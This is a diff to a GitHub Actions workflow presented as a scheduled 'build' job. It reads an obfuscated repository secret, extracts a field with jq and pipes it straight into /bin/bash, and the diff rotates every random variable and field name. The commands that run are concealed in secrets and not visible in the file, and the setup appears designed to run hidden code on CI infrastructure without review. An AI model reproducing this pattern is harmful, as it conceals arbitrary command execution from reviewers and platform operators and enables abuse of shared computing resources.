@@ -1,29 +1,26 @@
 name: chengyihai2603
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 3/6 * * *'
-
+    - cron: '30 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chengyihai2603
         env:
-          v7935: ${{ secrets.v7935 }}
+          j44026: ${{ secrets.j44026 }}
         run: |
-          echo $v7935 | jq -r .hdked47165 | /bin/bash
-          echo $i53404 | jq -r .tonre4115 | /bin/bash
-          echo $ib28 | jq -r .s2 | /bin/bash
-          echo $umcd1652 | jq -r .ag18647 | /bin/bash
-          echo $unwfh69754 | jq -r .y31270 | /bin/bash
-          echo $yqt6 | jq -r .lw8 | /bin/bash
-          echo $uifo72415 | jq -r .nx1807 | /bin/bash
-          echo $c9997 | jq -r .hb8856 | /bin/bash
-          echo $jsbkw8 | jq -r .flez36 | /bin/bash
-          echo $m8706 | jq -r .bc9 | /bin/bash
-          echo $f3106 | jq -r .vz01157 | /bin/bash
-          echo $bag28416 | jq -r .bqkv19 | /bin/bash
-          echo $rmyiv64848 | jq -r .it547 | /bin/bash
+          echo $j44026 | jq -r .nuy80 | /bin/bash
+          echo $tojt98912 | jq -r .xg78649 | /bin/bash
+          echo $imnl597 | jq -r .qmxg9178 | /bin/bash
+          echo $jw14 | jq -r .kkc98 | /bin/bash
+          echo $qo84611 | jq -r .k61926 | /bin/bash
+          echo $yxv6760 | jq -r .j5262 | /bin/bash
+          echo $kirqq68262 | jq -r .vxy53 | /bin/bash
+          echo $h596 | jq -r .eyu2 | /bin/bash
+          echo $ldy4 | jq -r .ph3676 | /bin/bash
 
